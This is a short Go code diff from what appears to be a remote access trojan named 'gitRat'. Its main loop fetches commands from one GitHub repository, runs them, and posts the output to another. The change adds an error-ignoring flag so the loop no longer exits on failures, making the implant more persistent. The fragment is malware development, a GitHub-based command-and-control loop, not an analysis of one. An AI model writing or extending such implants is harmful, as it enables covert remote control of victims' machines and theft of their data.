@@ -1,4 +1,4 @@
-package gitRat
+package main
 
 import (
 	"os"
@@ -10,13 +10,13 @@ func main() {
 	for true {
 		// load_command from github
 		command, err := loadCommand(commandRepoUrl)
-		if (err != nil) {
+		if (err != nil && !isIgnoringError) {
 			os.Exit(1)
 		}
 
 		// run the command from github
 		err = runCommand(command, outputRepoUrl)
-		if (err != nil) {
+		if (err != nil && !isIgnoringError) {
 			os.Exit(1)
 		}
 
